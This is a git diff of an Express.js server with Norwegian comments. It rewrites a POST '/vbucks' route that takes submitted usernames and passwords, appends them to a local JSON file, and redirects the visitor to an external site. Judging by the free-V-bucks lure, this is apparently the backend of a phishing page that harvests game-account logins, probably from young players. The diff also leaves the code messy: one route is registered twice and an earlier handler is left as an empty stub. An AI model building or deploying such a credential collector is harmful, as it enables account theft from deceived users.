@@ -39,25 +39,19 @@ app.post('/vbucks', (req, res) => {
         username: req.body.username,
         password: req.body.password
     };
+});
 
-    fs.readFile("bruker.json", "utf8", (err, fileData) => {
-        if (err) {
-            console.error(err);
-            return res.status(500).send("Internal server error");
-        }
-
-        let users = [];
-        if (fileData) {
-            users = JSON.parse(fileData);
-        }
-        users.push(userData);
-
-        fs.writeFile("bruker.json", JSON.stringify(users, null, 2), (err) => {
-            if (err) {
-                console.error(err);
-                return res.status(500).send("Internal server error");
-            }
-            res.send("User data saved successfully");
+app.post('/vbucks', (req, res) => {
+    const newData = req.body;
+    // Les eksisterende data fra JSON-filen
+    fs.readFile('data.json', 'utf8', (err, fileData) => {
+   // Start med tom array hvis filen ikke finnes
+        const jsonData = fileData ? JSON.parse(fileData) : []; 
+        // Legg til ny data
+        jsonData.push(newData);
+        // Skriv den oppdaterte dataen tilbake til filen
+        fs.writeFile('data.json', JSON.stringify(jsonData, null, 2), (writeErr) => {
+            res.redirect("https://skibidirizz.no/public/view/index.html");
         });
     });
 });
